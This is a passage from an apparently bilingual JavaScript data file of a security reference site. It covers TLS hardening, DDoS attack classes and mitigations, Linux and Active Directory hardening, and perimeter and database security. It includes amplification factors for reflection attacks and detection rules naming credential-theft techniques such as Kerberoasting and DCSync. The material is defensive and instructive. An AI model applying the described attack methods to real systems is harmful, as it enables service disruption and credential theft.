  <li><strong>Trust-Store.</strong> OS-Bundle (Microsoft, Apple, Mozilla NSS). Custom-Enterprise-CA vorsichtig angehängt — over-broad Trust = SSL-Inspection wird Lateral-Movement-Kanal wenn Appliance kompromittiert.</li>
  <li><strong>Chain-Konstruktion.</strong> Server soll gesamte Chain außer Root senden. Fehlendes Intermediate = Client muss aus AIA fetchen (langsam, manchmal failing).</li>
  <li><strong>Validation-Strenge.</strong> Verifizieren: Chain zu Trusted-Root, Gültigkeitsdaten, Hostname-Match, Key-Usage-Extension, Basic-Constraints, Name-Constraints.</li>
  <li><strong>Revocation.</strong>
    <ul>
      <li>CRL: groß, periodisch heruntergeladen, oft Soft-Fail (unreachable als valid behandelt).</li>
      <li>OCSP: Echtzeit, Privacy-Leak (CA lernt wen du besuchst), oft Soft-Fail.</li>
      <li>OCSP-Stapling: Server inkludiert CA-signed Status im Handshake. Am nächsten an der richtigen Antwort.</li>
      <li>Kurzlebige Certs (Let's Encrypt 90 Tage, irgendwann 6 Tage) machen Revocation weniger kritisch.</li>
    </ul>
  </li>
  <li><strong>Certificate-Transparency.</strong> Alle Public-CA-Issuance in Append-Only-Merkle-Trees geloggt. Eigene Domains via <code>crt.sh</code>, <code>certstream</code>, <code>Censys</code> auf Mis-Issuance monitoren. Fängt Phishing-Certs und Rogue-CAs.</li>
  <li><strong>Pinning.</strong> HPKP deprecated (Foot-Gun). Statisches Pinning nur in Mobile-Apps nutzen. Für Web: auf CT-Monitoring + kurze Cert-Lifetimes setzen.</li>
  <li><strong>HSTS.</strong> <code>Strict-Transport-Security: max-age=63072000; includeSubDomains; preload</code>. Preload-Liste via <code>hstspreload.org</code> killt First-Visit-Downgrade.</li>
</ul>

<h2>Historische Angriffs-Timeline</h2>
<ul>
  <li><strong>BEAST (2011).</strong> CBC-IV vorhersagbar in TLS 1.0. Counter: 1/n-1-Split oder TLS 1.1+.</li>
  <li><strong>CRIME (2012).</strong> TLS-Kompression leakt via Länge. Counter: TLS-Level-Kompression disabeln.</li>
  <li><strong>BREACH (2013).</strong> HTTP-Level-Kompression leakt reflected Secrets. Counter: nicht komprimieren + nicht reflektieren.</li>
  <li><strong>Lucky 13 (2013).</strong> CBC-MAC-Timing-Leak. Counter: AEAD-Cipher.</li>
  <li><strong>POODLE (2014).</strong> SSLv3-Padding-Oracle. Counter: SSLv3 killen.</li>
  <li><strong>FREAK / Logjam (2015).</strong> Export-Grade-RSA / DH durch Downgrade erzwungen. Counter: EXPORT-Ciphers killen, ≥2048-bit DH oder ECDHE.</li>
  <li><strong>DROWN (2016).</strong> SSLv2 auf gleichem Key wie TLS-1.2-Server kompromittiert beide. Counter: SSLv2 killen, getrennte Keys.</li>
  <li><strong>Sweet32 (2016).</strong> 64-bit-Block-Cipher (3DES) Kollisions-Angriff auf langlebige Connection. Counter: AES.</li>
  <li><strong>ROBOT (2017).</strong> Bleichenbacher auf miskonfiguriertem RSA-PKCS#1v1.5 wiederbelebt. Counter: ECDHE bevorzugen; bei RSA Vendor-Patches.</li>
</ul>

<h2>Aktuelle sichere Baseline</h2>
<ul>
  <li>TLS 1.3 mit TLS-1.2-Fallback (nur für ancient Client-Kompatibilität).</li>
  <li>Cipher limitiert auf AES-GCM, AES-CCM, ChaCha20-Poly1305.</li>
  <li>ECDHE (P-256 oder X25519) für Key-Agreement.</li>
  <li>Cert mit ECDSA P-256 oder mindestens RSA-2048 signiert.</li>
  <li>OCSP-Stapling on, HSTS on mit langer max-age + Preload, CT-Monitoring on.</li>
  <li>Mozilla SSL-Configuration-Generator ("Modern" oder "Intermediate") ist das kanonische Rezept.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Für neue Deployments TLS 1.3 only. Für gemischte Client-Umgebungen TLS 1.2 mit der eingeschränkten Cipher-Liste. Quartalsweise mit <code>testssl.sh</code>, <code>nmap --script ssl-enum-ciphers</code> oder Qualys SSL Labs auditen.</div>
`
    ),
    phases: []
  },
  {
    id: "ddos-defense-reference",
    domain: "defensive-ops", tier: 2,
    title: T("DDoS Defense — Reference", "DDoS-Abwehr — Referenz"),
    blurb: T(
      "DDoS attack-class taxonomy with the corresponding mitigation layers — anycast, scrubbing, app-layer rate logic.",
      "DDoS-Angriffsklassen-Taxonomie mit den passenden Mitigation-Layern — Anycast, Scrubbing, App-Layer-Rate-Logik."
    ),
    body: B(
      `
<h2>Volumetric attacks (L3/L4)</h2>
<ul>
  <li><strong>UDP flood / generic packet flood.</strong> Saturate ingress bandwidth. Modern record peaks: 3.8 Tbps (Cloudflare, 2024). No origin-side mitigation possible above your transit capacity.</li>
  <li><strong>Reflection / amplification.</strong> Attacker spoofs victim source IP, queries a UDP service that responds with larger payload.
    <ul>
      <li>DNS (amp factor ~28×) — mitigated by closing open resolvers.</li>
      <li>NTP monlist (~556×) — patched but legacy still exposed.</li>
      <li>memcached (~51,000×) — used in 1.3 Tbps GitHub 2018; should never be internet-exposed.</li>
      <li>CLDAP (~70×), SNMP (~6×), SSDP (~30×).</li>
    </ul>
  </li>
  <li><strong>Mitigation.</strong>
    <ul>
      <li>Anycast network. Attack traffic distributed across N edge sites.</li>
      <li>Upstream scrubbing — provider absorbs and drops; clean traffic forwarded.</li>
      <li>BGP Flowspec for ISP-level filtering.</li>
      <li>RTBH (Remote-Triggered Blackhole) — last-resort, drops everything to victim IP.</li>
      <li>BCP 38 / ingress filtering at ISP level — prevents spoofed source IPs leaving the network. Slow rollout industry-wide.</li>
    </ul>
  </li>
</ul>

<h2>Protocol-layer attacks (L4)</h2>
<ul>
  <li><strong>SYN flood.</strong> Half-open connections fill the queue. Mitigation: SYN cookies (Linux <code>net.ipv4.tcp_syncookies=1</code>) — stateless until ACK. SYN proxy at the edge that completes handshake then proxies. Increase <code>tcp_max_syn_backlog</code> + <code>somaxconn</code>.</li>
  <li><strong>ACK flood.</strong> Bypasses SYN-cookie defenses by sending ACKs against non-existent connections. Mitigation: rate-limit at edge, stateful firewall drops.</li>
  <li><strong>Slow-Loris / Slowread.</strong> Open many connections, send headers one byte at a time, or read response one byte per second. Mitigation: client-rate timeouts, max-headers-time, per-connection memory caps. nginx <code>client_body_timeout</code> / <code>client_header_timeout</code> tight (10s).</li>
  <li><strong>R-U-Dead-Yet (RUDY).</strong> Long-form POST with very slow body. Mitigation: max-POST-size, body-timeout.</li>
  <li><strong>TCP state exhaustion.</strong> Botnets establish many real-looking connections. Mitigation: per-IP connection limit, GeoIP filtering, captcha challenge on suspicious source.</li>
</ul>

<h2>Application-layer attacks (L7)</h2>
<ul>
  <li><strong>HTTP flood.</strong> Many GET/POST. Structurally legitimate. Mitigation: per-IP rate limit, anomaly detection on User-Agent / JA3 / referer distribution. JavaScript challenge / proof-of-work / captcha.</li>
  <li><strong>Cache-buster.</strong> Random query string on every request defeats CDN cache. Mitigation: normalize query string, rate-limit unique-cache-key creation per IP.</li>
  <li><strong>Slowpost on expensive endpoints.</strong> Search, report-generation endpoints chosen because each request burns CPU. Mitigation: per-endpoint per-IP rate, async queue with backpressure, lower priority for unauthenticated.</li>
  <li><strong>Login endpoint flood.</strong> Credential-stuffing or burn capacity. Mitigation: progressive captcha, account-lockout, IP-reputation rate adjustment.</li>
  <li><strong>HTTP/2 Rapid Reset (CVE-2023-44487).</strong> RST_STREAM after request creates extreme amplification. Mitigation: implement rate limit on stream resets at server.</li>
</ul>

<h2>Per-endpoint rate logic — design</h2>
<ul>
  <li><strong>Tiered rates.</strong> Anonymous &lt; authenticated &lt; trusted partner. Different limits per identity tier.</li>
  <li><strong>Cost-weighted.</strong> Cheap endpoints high rate; expensive (search, export, ML inference) low rate.</li>
  <li><strong>Sliding window.</strong> Token-bucket (smooth) or fixed-window-with-rollover. Avoid hard fixed windows (attackers hit at second 0 of each window).</li>
  <li><strong>Identity for rate.</strong> IP (cheap, easy to evade with botnet), user (better, requires auth), browser-fingerprint (defeats simple rotation).</li>
  <li><strong>Challenge before block.</strong> Rate near threshold → JS challenge / captcha → only block after challenge fails.</li>
</ul>

<h2>Build vs buy</h2>
<ul>
  <li><strong>Volumetric defense is buy.</strong> You don't have Tbps of transit. Cloudflare, AWS Shield Advanced, Akamai Prolexic, Imperva, NETSCOUT Arbor.</li>
  <li><strong>L4 defense is mixed.</strong> Edge appliance + provider — both layers.</li>
  <li><strong>L7 defense is build with components.</strong> WAF + rate-limit at edge + application-aware throttle in app + alerting on anomaly. CDN provides defaults; tuning per app is on you.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>The DDoS that takes you down is rarely the largest published number. It's the L7 attack tuned to your most expensive endpoint, sized just under the threshold that triggers your provider's blanket-mitigation. Defend per-endpoint cost-asymmetrically, not by aggregate bandwidth.</div>
`,
      `
<h2>Volumetrische Angriffe (L3/L4)</h2>
<ul>
  <li><strong>UDP-Flood / generischer Packet-Flood.</strong> Ingress-Bandbreite saturieren. Moderne Record-Peaks: 3.8 Tbps (Cloudflare, 2024). Keine Origin-seitige Mitigation oberhalb deiner Transit-Kapazität möglich.</li>
  <li><strong>Reflection / Amplification.</strong> Angreifer spoofed Victim-Source-IP, queryt UDP-Service der mit größerem Payload antwortet.
    <ul>
      <li>DNS (Amp-Faktor ~28×) — mitigiert durch Schließen offener Resolver.</li>
      <li>NTP-monlist (~556×) — gepatched, aber Legacy noch exposed.</li>
      <li>memcached (~51,000×) — in 1.3 Tbps GitHub 2018 genutzt; sollte nie Internet-exposed sein.</li>
      <li>CLDAP (~70×), SNMP (~6×), SSDP (~30×).</li>
    </ul>
  </li>
  <li><strong>Mitigation.</strong>
    <ul>
      <li>Anycast-Netzwerk. Attack-Traffic über N Edge-Sites verteilt.</li>
      <li>Upstream-Scrubbing — Provider absorbiert und droppt; Clean-Traffic geforwarded.</li>
      <li>BGP-Flowspec für ISP-Level-Filtering.</li>
      <li>RTBH (Remote-Triggered-Blackhole) — Last-Resort, droppt alles zur Victim-IP.</li>
      <li>BCP 38 / Ingress-Filtering auf ISP-Level — verhindert dass Spoofed-Source-IPs das Netzwerk verlassen. Industrieweiter Rollout langsam.</li>
    </ul>
  </li>
</ul>

<h2>Protokoll-Layer-Angriffe (L4)</h2>
<ul>
  <li><strong>SYN-Flood.</strong> Half-Open-Connections füllen die Queue. Mitigation: SYN-Cookies (Linux <code>net.ipv4.tcp_syncookies=1</code>) — stateless bis ACK. SYN-Proxy am Edge, der Handshake completed dann proxied. <code>tcp_max_syn_backlog</code> + <code>somaxconn</code> erhöhen.</li>
  <li><strong>ACK-Flood.</strong> Umgeht SYN-Cookie-Defenses durch ACKs gegen nicht-existierende Connections. Mitigation: Rate-Limit am Edge, Stateful-Firewall droppt.</li>
  <li><strong>Slow-Loris / Slowread.</strong> Viele Connections öffnen, Header byteweise senden oder Response 1 Byte/s lesen. Mitigation: Client-Rate-Timeouts, max-Headers-Time, Per-Connection-Memory-Caps. nginx <code>client_body_timeout</code> / <code>client_header_timeout</code> straff (10s).</li>
  <li><strong>R-U-Dead-Yet (RUDY).</strong> Long-Form-POST mit sehr langsamem Body. Mitigation: max-POST-Size, Body-Timeout.</li>
  <li><strong>TCP-State-Exhaustion.</strong> Botnets etablieren viele real-aussehende Connections. Mitigation: Per-IP-Connection-Limit, GeoIP-Filtering, Captcha-Challenge auf verdächtigem Source.</li>
</ul>

<h2>Application-Layer-Angriffe (L7)</h2>
<ul>
  <li><strong>HTTP-Flood.</strong> Viele GET/POST. Strukturell legitim. Mitigation: Per-IP-Rate-Limit, Anomaly-Detection auf User-Agent- / JA3- / Referer-Verteilung. JS-Challenge / Proof-of-Work / Captcha.</li>
  <li><strong>Cache-Buster.</strong> Random-Query-String pro Request schlägt CDN-Cache. Mitigation: Query-String normalisieren, Rate-Limit auf Unique-Cache-Key-Creation pro IP.</li>
  <li><strong>Slowpost auf teuren Endpoints.</strong> Search-, Report-Generation-Endpoints gewählt weil jeder Request CPU verbrennt. Mitigation: Per-Endpoint-Per-IP-Rate, Async-Queue mit Backpressure, niedrigere Priority für Unauthenticated.</li>
  <li><strong>Login-Endpoint-Flood.</strong> Credential-Stuffing oder Capacity-Burn. Mitigation: progressive Captcha, Account-Lockout, IP-Reputation-Rate-Adjustment.</li>
  <li><strong>HTTP/2-Rapid-Reset (CVE-2023-44487).</strong> RST_STREAM nach Request erzeugt extreme Amplification. Mitigation: Rate-Limit auf Stream-Resets am Server implementieren.</li>
</ul>

<h2>Per-Endpoint-Rate-Logik — Design</h2>
<ul>
  <li><strong>Tiered Rates.</strong> Anonymous &lt; Authenticated &lt; Trusted-Partner. Verschiedene Limits pro Identity-Tier.</li>
  <li><strong>Cost-Weighted.</strong> Günstige Endpoints hohe Rate; teure (Search, Export, ML-Inference) niedrige.</li>
  <li><strong>Sliding-Window.</strong> Token-Bucket (glatt) oder Fixed-Window-with-Rollover. Harte Fixed-Windows vermeiden (Angreifer hitten Sekunde 0 jedes Fensters).</li>
  <li><strong>Identity für Rate.</strong> IP (günstig, mit Botnet leicht zu umgehen), User (besser, erfordert Auth), Browser-Fingerprint (schlägt simple Rotation).</li>
  <li><strong>Challenge vor Block.</strong> Rate nahe Threshold → JS-Challenge / Captcha → Block erst nach Challenge-Fail.</li>
</ul>

<h2>Build vs Buy</h2>
<ul>
  <li><strong>Volumetrische Defense ist Buy.</strong> Du hast keine Tbps Transit. Cloudflare, AWS Shield Advanced, Akamai Prolexic, Imperva, NETSCOUT Arbor.</li>
  <li><strong>L4-Defense ist gemischt.</strong> Edge-Appliance + Provider — beide Schichten.</li>
  <li><strong>L7-Defense ist Build mit Components.</strong> WAF + Rate-Limit am Edge + Application-Aware-Throttle in der App + Alerting auf Anomalie. CDN liefert Defaults; Tuning pro App ist deine Aufgabe.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Der DDoS, der dich umlegt, ist selten die größte publizierte Zahl. Es ist der L7-Angriff, getuned auf deinen teuersten Endpoint, gesized knapp unter dem Threshold, der die Blanket-Mitigation deines Providers triggert. Per-Endpoint kosten-asymmetrisch defenden, nicht über aggregierte Bandbreite.</div>
`
    ),
    phases: []
  },
  {
    id: "host-and-network-hardening",
    domain: "defensive-ops", tier: 2,
    title: T("Host & Network Hardening", "Host- & Netzwerk-Härtung"),
    blurb: T(
      "Linux operator hardening, TCP/IP operational notes for detection engineers, AD defense from the defender's perspective, and data-center host hardening where physical access intersects vendor patches.",
      "Linux-Operator-Härtung, TCP/IP-operative Notizen für Detection-Engineers, AD-Defense aus Defender-Sicht und Data-Center-Host-Härtung, wo physischer Zugriff und Hersteller-Patches sich kreuzen."
    ),
    body: B(
      `
<h2>Linux operator hygiene</h2>
<ul>
  <li><strong>Account discipline.</strong>
    <ul>
      <li>No shared interactive accounts; one human → one account → one SSH key.</li>
      <li>Service accounts: no password, no shell, only sshd ForceCommand or systemd-managed.</li>
      <li><code>sudo</code> over <code>su</code>; per-command grants in <code>/etc/sudoers.d/</code>, not blanket <code>ALL</code>.</li>
      <li>SSH key rotation: enrollment via central CA (SSH certificates with TTL) instead of authorized_keys files.</li>
      <li>Disable root SSH login (<code>PermitRootLogin no</code>), disable password auth (<code>PasswordAuthentication no</code>).</li>
    </ul>
  </li>
  <li><strong>Package supply chain.</strong>
    <ul>
      <li>Signed package enforcement: <code>gpgcheck=1</code> + <code>repo_gpgcheck=1</code> on yum/dnf; <code>apt-secure</code> defaults intact.</li>
      <li>No untrusted repositories; mirror trusted upstream into internal repo with signed metadata.</li>
      <li>For containers: image-signing (cosign/Notation) + admission policy that rejects unsigned.</li>
      <li>SBOM generation on every build (<code>syft</code>, <code>trivy</code>); diff against last build at gate.</li>
    </ul>
  </li>
  <li><strong>Kernel surface tightening.</strong>
    <ul>
      <li><code>sysctl kernel.kptr_restrict=2</code>, <code>kernel.dmesg_restrict=1</code>, <code>kernel.yama.ptrace_scope=2</code>.</li>
      <li>Module loading: <code>kernel.modules_disabled=1</code> after boot if dynamic loading not needed.</li>
      <li>AppArmor/SELinux in enforcing mode for daemons.</li>
      <li>auditd rules for module-load, executable-mmap-from-tmp, sensitive file access.</li>
      <li>IMA / dm-verity for boot-time integrity on appliance-style hosts.</li>
    </ul>
  </li>
</ul>

<h2>TCP/IP notes for detection engineers</h2>
<ul>
  <li><strong>Scanner handshake telltales.</strong>
    <ul>
      <li>nmap SYN scan: RST returned on closed; no RST seen on open (SYN-ACK followed by RST from scanner).</li>
      <li>masscan: extremely high source-port rotation, no kernel state, SYN-only.</li>
      <li>zmap: similar, distinctive IP-ID = 54321 by default.</li>
    </ul>
  </li>
  <li><strong>Fragmentation evasion.</strong> IDS that doesn't reassemble misses fragmented signatures. Modern Suricata/Zeek reassemble. Watch for tiny first fragment with header-truncating offsets.</li>
  <li><strong>State-table sizing.</strong> Conntrack limits (<code>net.netfilter.nf_conntrack_max</code>) — exhaustion drops new connections. Hash size <code>nf_conntrack_buckets</code> = max/4. Tune for actual peak concurrent flows.</li>
  <li><strong>Timeout choices.</strong>
    <ul>
      <li>TCP established: 5 days default; reduce to 1 day if memory pressured.</li>
      <li>UDP: 30 sec default; per-flow long-running UDP needs increase.</li>
    </ul>
  </li>
  <li><strong>JA3/JA4 fingerprinting.</strong> Hash of TLS ClientHello fields. Same client software = same fingerprint regardless of source IP. Powerful detection axis for stuffer traffic.</li>
</ul>

<h2>AD defense — companion to AD pentest reference</h2>
<ul>
  <li><strong>Kerberoasting detection.</strong> Event 4769 with TGS request for SPN of user account using RC4 (eType=0x17). Alert on volume to a single user.</li>
  <li><strong>AS-REP roasting.</strong> Disable "Do not require Kerberos preauthentication" attribute on all accounts. Alert on 4768 AS-REQ where Preauth=0.</li>
  <li><strong>DCSync detection.</strong> Event 4662 with <code>Properties</code> containing <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> (DS-Replication-Get-Changes). Filter known replication accounts.</li>
  <li><strong>Golden ticket detection.</strong> 4624 with LogonType=3, NetworkInfo blank fields. Mimikatz-style PAC anomalies. Pre-built rule in Defender for Identity, Microsoft DART playbooks.</li>
  <li><strong>Constrained-delegation abuse.</strong> Audit <code>msDS-AllowedToDelegateTo</code> changes (event 5136). Inventory and remove unconstrained delegation everywhere possible.</li>
  <li><strong>Tier 0 isolation.</strong> Domain controllers, AD admins, PKI — own dedicated tier with no shared workstations, no shared service accounts, separate jump hosts.</li>
  <li><strong>LAPS.</strong> Local-admin-password solution. Random per-host, rotated, retrievable only by authorized accounts. Kills pass-the-hash lateral.</li>
  <li><strong>Credential Guard / RDP Restricted Admin.</strong> Prevents NTLM/Kerberos credential exposure on jump hosts.</li>
</ul>

<h2>Data-center host hardening</h2>
<ul>
  <li><strong>Firmware / BMC.</strong> iLO, iDRAC, IPMI on management VLAN, not on production. Default credentials changed. Firmware patched on documented cadence; vendor advisories monitored.</li>
  <li><strong>Secure boot + measured boot.</strong> TPM-backed where supported. PCR values monitored; drift = possible firmware tamper.</li>
  <li><strong>Physical access.</strong> Bezel locks, cage / cabinet access logs, tamper-evident seals on chassis. Console (serial / KVM) access via auditable terminal server, not directly.</li>
  <li><strong>Disk encryption.</strong> LUKS (Linux) / BitLocker (Windows) with TPM-bound key. Mitigates drive-pull theft. Doesn't mitigate online compromise.</li>
  <li><strong>Out-of-band update path.</strong> Plan for "we need to patch but can't go through normal change window" — physical or BMC console.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For most enterprises, the biggest hardening ROI is "LAPS + tier-0 isolation + Credential Guard" on the Windows side and "SSH CA + sudoers per-command + auditd module-load" on the Linux side. Everything else is incremental on top of those four.</div>
`,
      `
<h2>Linux-Operator-Hygiene</h2>
<ul>
  <li><strong>Account-Disziplin.</strong>
    <ul>
      <li>Keine geteilten interaktiven Accounts; ein Mensch → ein Account → ein SSH-Key.</li>
      <li>Service-Accounts: kein Passwort, keine Shell, nur sshd-ForceCommand oder systemd-managed.</li>
      <li><code>sudo</code> statt <code>su</code>; Per-Command-Grants in <code>/etc/sudoers.d/</code>, kein Blanket-<code>ALL</code>.</li>
      <li>SSH-Key-Rotation: Enrollment via Central-CA (SSH-Certificates mit TTL) statt authorized_keys-Files.</li>
      <li>Root-SSH-Login disabeln (<code>PermitRootLogin no</code>), Password-Auth disabeln (<code>PasswordAuthentication no</code>).</li>
    </ul>
  </li>
  <li><strong>Package-Supply-Chain.</strong>
    <ul>
      <li>Signed-Package-Erzwingung: <code>gpgcheck=1</code> + <code>repo_gpgcheck=1</code> auf yum/dnf; <code>apt-secure</code>-Defaults intakt.</li>
      <li>Keine untrusted Repositories; trusted Upstream in internes Repo mit signed Metadata mirroren.</li>
      <li>Für Container: Image-Signing (cosign/Notation) + Admission-Policy, die Unsigned ablehnt.</li>
      <li>SBOM-Generierung pro Build (<code>syft</code>, <code>trivy</code>); Diff gegen letzten Build am Gate.</li>
    </ul>
  </li>
  <li><strong>Kernel-Surface-Verschärfung.</strong>
    <ul>
      <li><code>sysctl kernel.kptr_restrict=2</code>, <code>kernel.dmesg_restrict=1</code>, <code>kernel.yama.ptrace_scope=2</code>.</li>
      <li>Module-Loading: <code>kernel.modules_disabled=1</code> nach Boot wenn dynamisches Laden nicht benötigt.</li>
      <li>AppArmor/SELinux im Enforcing-Mode für Daemons.</li>
      <li>auditd-Rules für Module-Load, Executable-Mmap-from-Tmp, Sensitive-File-Access.</li>
      <li>IMA / dm-verity für Boot-Time-Integrity auf Appliance-style Hosts.</li>
    </ul>
  </li>
</ul>

<h2>TCP/IP-Notizen für Detection-Engineers</h2>
<ul>
  <li><strong>Scanner-Handshake-Tells.</strong>
    <ul>
      <li>nmap-SYN-Scan: RST returned bei Closed; kein RST bei Open (SYN-ACK gefolgt von RST vom Scanner).</li>
      <li>masscan: extrem hohe Source-Port-Rotation, kein Kernel-State, SYN-only.</li>
      <li>zmap: ähnlich, distinktive IP-ID = 54321 by default.</li>
    </ul>
  </li>
  <li><strong>Fragmentations-Evasion.</strong> IDS, das nicht reassembled, verpasst fragmentierte Signaturen. Moderne Suricata/Zeek reassemblen. Auf winziges erstes Fragment mit Header-truncating Offsets achten.</li>
  <li><strong>State-Table-Sizing.</strong> Conntrack-Limits (<code>net.netfilter.nf_conntrack_max</code>) — Exhaustion droppt neue Connections. Hash-Size <code>nf_conntrack_buckets</code> = max/4. Auf tatsächlichen Peak-Concurrent-Flow tunen.</li>
  <li><strong>Timeout-Wahlen.</strong>
    <ul>
      <li>TCP-Established: 5 Tage Default; auf 1 Tag reduzieren bei Speicher-Druck.</li>
      <li>UDP: 30 Sek Default; per-Flow lang-laufendes UDP braucht Increase.</li>
    </ul>
  </li>
  <li><strong>JA3/JA4-Fingerprinting.</strong> Hash der TLS-ClientHello-Felder. Gleiche Client-Software = gleicher Fingerprint unabhängig von Source-IP. Mächtige Detektionsachse für Stuffer-Traffic.</li>
</ul>

<h2>AD-Defense — Begleiter zur AD-Pentest-Referenz</h2>
<ul>
  <li><strong>Kerberoasting-Detektion.</strong> Event 4769 mit TGS-Request für SPN eines User-Accounts mit RC4 (eType=0x17). Auf Volumen zu einem einzelnen User alarmieren.</li>
  <li><strong>AS-REP-Roasting.</strong> "Do not require Kerberos preauthentication"-Attribut auf allen Accounts disabeln. Auf 4768 AS-REQ mit Preauth=0 alarmieren.</li>
  <li><strong>DCSync-Detektion.</strong> Event 4662 mit <code>Properties</code> die <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> (DS-Replication-Get-Changes) enthalten. Bekannte Replikations-Accounts filtern.</li>
  <li><strong>Golden-Ticket-Detektion.</strong> 4624 mit LogonType=3, NetworkInfo-Blank-Fields. Mimikatz-style PAC-Anomalien. Vorgebaute Rule in Defender for Identity, Microsoft DART-Playbooks.</li>
  <li><strong>Constrained-Delegation-Missbrauch.</strong> <code>msDS-AllowedToDelegateTo</code>-Änderungen auditen (Event 5136). Unconstrained-Delegation überall wo möglich inventorisieren und entfernen.</li>
  <li><strong>Tier-0-Isolation.</strong> Domain-Controller, AD-Admins, PKI — eigene dedizierte Tier ohne shared Workstations, shared Service-Accounts, separate Jump-Hosts.</li>
  <li><strong>LAPS.</strong> Local-Admin-Password-Solution. Random pro Host, rotiert, nur von autorisierten Accounts abrufbar. Killt Pass-the-Hash-Lateral.</li>
  <li><strong>Credential-Guard / RDP-Restricted-Admin.</strong> Verhindert NTLM-/Kerberos-Credential-Exposure auf Jump-Hosts.</li>
</ul>

<h2>Data-Center-Host-Härtung</h2>
<ul>
  <li><strong>Firmware / BMC.</strong> iLO, iDRAC, IPMI auf Management-VLAN, nicht in Produktion. Default-Credentials geändert. Firmware auf dokumentierter Kadenz gepatched; Vendor-Advisories monitort.</li>
  <li><strong>Secure-Boot + Measured-Boot.</strong> TPM-backed wo unterstützt. PCR-Werte monitort; Drift = mögliches Firmware-Tamper.</li>
  <li><strong>Physischer Zugriff.</strong> Bezel-Locks, Cage-/Cabinet-Access-Logs, Tamper-Evident-Seals auf Chassis. Console (Serial / KVM) via auditierbarem Terminal-Server, nicht direkt.</li>
  <li><strong>Disk-Verschlüsselung.</strong> LUKS (Linux) / BitLocker (Windows) mit TPM-gebundenem Key. Mitigiert Drive-Pull-Diebstahl. Nicht Online-Kompromittierung.</li>
  <li><strong>Out-of-Band-Update-Path.</strong> Plan für "wir müssen patchen, aber können nicht durch normales Change-Window" — physische oder BMC-Console.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Für die meisten Enterprises ist der größte Hardening-ROI "LAPS + Tier-0-Isolation + Credential-Guard" auf Windows-Seite und "SSH-CA + Sudoers-per-Command + auditd-Module-Load" auf Linux-Seite. Alles andere ist inkrementell darauf.</div>
`
    ),
    phases: ["report"]
  },
  {
    id: "perimeter-and-database-security",
    domain: "defensive-ops", tier: 3,
    title: T("Perimeter, Office & Database Security", "Perimeter-, Office- & Datenbank-Sicherheit"),
    blurb: T(
      "What changes at the perimeter, the realities of office network hardening (BYOD, printers, guest segmentation), and database security beyond SQL injection — replication, backup, encryption-at-rest.",
      "Was sich am Perimeter ändert, die Realitäten der Office-Netzwerk-Härtung (BYOD, Drucker, Gast-Segmentierung) und Datenbank-Sicherheit jenseits SQL-Injection — Replikation, Backup, Encryption-at-Rest."
    ),
    body: B(
      `
<h2>Perimeter (external-facing web)</h2>
<ul>
  <li><strong>Discoverability.</strong> Your domain is enumerated by Censys, Shodan, FOFA, plus every recon tool. Assume 100% of your external surface is known. Inventory continuously — what you don't know about, you don't defend.</li>
  <li><strong>Exposure budget.</strong> Every public endpoint = attack surface. Catalog: hostname + port + service + owner. Decommission orphaned surface aggressively. "Temporary" subdomains live forever.</li>
  <li><strong>Subdomain takeover.</strong> DNS record points at decommissioned cloud resource (S3 bucket, Azure web app, Heroku app). Attacker claims the resource = controls subdomain. Quarterly DNS audit; automated <code>subjack</code>/<code>nuclei</code> templates.</li>
  <li><strong>Credential-stuffing baseline.</strong> 99% of login traffic on a popular endpoint is malicious automation. Counters:
    <ul>
      <li>HaveIBeenPwned integration — reject known-leaked passwords on signup/change.</li>
      <li>Passkeys / WebAuthn as primary; password as fallback.</li>
      <li>Per-IP/JA4/User-Agent rate limit on login; progressive captcha; account-lockout with sane recovery.</li>
      <li>MFA mandatory for any non-trivial action.</li>
    </ul>
  </li>
  <li><strong>Scraping cooperatives.</strong> Distributed residential-proxy botnets scrape protected content. Heuristics: behavioral biometrics (mouse/scroll patterns), browser-feature inconsistency, request-velocity per identity.</li>
  <li><strong>Abuse-traffic patterns.</strong> Cross-protocol noise — same IP block trying SSH, FTP, RDP, HTTP login — auto-block at network layer. Reputation feeds (AbuseIPDB, Spamhaus, GreyNoise) reduce noise.</li>
</ul>

<h2>Office network</h2>
<ul>
  <li><strong>BYOD admission.</strong>
    <ul>
      <li>802.1X with certificate-based auth on wired and wireless.</li>
      <li>NAC posture check (OS version, EDR running, disk encryption on) before issuing IP.</li>
      <li>Failed posture → quarantine VLAN with remediation portal.</li>
    </ul>
  </li>
  <li><strong>Segmentation.</strong>
    <ul>
      <li>Corp VLAN — managed devices only.</li>
      <li>BYOD VLAN — personal devices; cannot reach corp resources except via VPN/ZTNA.</li>
      <li>Guest VLAN — internet only, isolated from everything corporate.</li>
      <li>IoT/printer VLAN — restricted egress (print server, NTP, vendor cloud only).</li>
    </ul>
  </li>
  <li><strong>Printer reality.</strong> Printers have OS, web admin, default creds, telnet/FTP open, and CVE history. Treat as untrusted: dedicated VLAN, no inbound from corp, firmware on schedule, default creds changed.</li>
  <li><strong>IoT noise floor.</strong> Conference-room displays, smart TVs, sensors. Default behavior: phone home to vendor cloud, broadcast mDNS. Mitigate: per-device-class allow-list egress; block broadcast/multicast bridging across VLANs.</li>
  <li><strong>Guest segmentation that survives.</strong> Separate SSID + separate VLAN + separate egress + client isolation (no peer-to-peer on guest). Social-engineering bridge (employee plugs guest device into corp VLAN port) caught by 802.1X.</li>
  <li><strong>Useful audit trail.</strong> DHCP leases (IP → MAC → switch port mapping), DNS query logs (catches malware C2 and shadow IT), 802.1X auth events. Compliance-theater audit trail = uncorrelated raw syslog with no analysis surface.</li>
</ul>

<h2>Database security beyond injection</h2>
<ul>
  <li><strong>Replication topology.</strong>
    <ul>
      <li>Primary-replica async — replica lag means RPO = lag at incident. Don't promise zero data loss.</li>
      <li>Synchronous multi-region — slower writes, zero data loss on single-region failure.</li>
      <li>Logical replication — selective tables, cross-version. Useful for migration and audit feed.</li>
    </ul>
  </li>
  <li><strong>Backup posture (3-2-1 + ransomware-resilient).</strong>
    <ul>
      <li>3 copies, 2 media types, 1 off-site. Modern addendum: 1 immutable/air-gapped.</li>
      <li>Off-host: separate machine.</li>
      <li>Off-network: not reachable from production network.</li>
      <li>Off-account (cloud): separate AWS/GCP/Azure account with one-way replication and object-lock immutability.</li>
      <li>Tested restore: quarterly tabletop, annual full restore exercise. Untested backups are aspirational.</li>
    </ul>
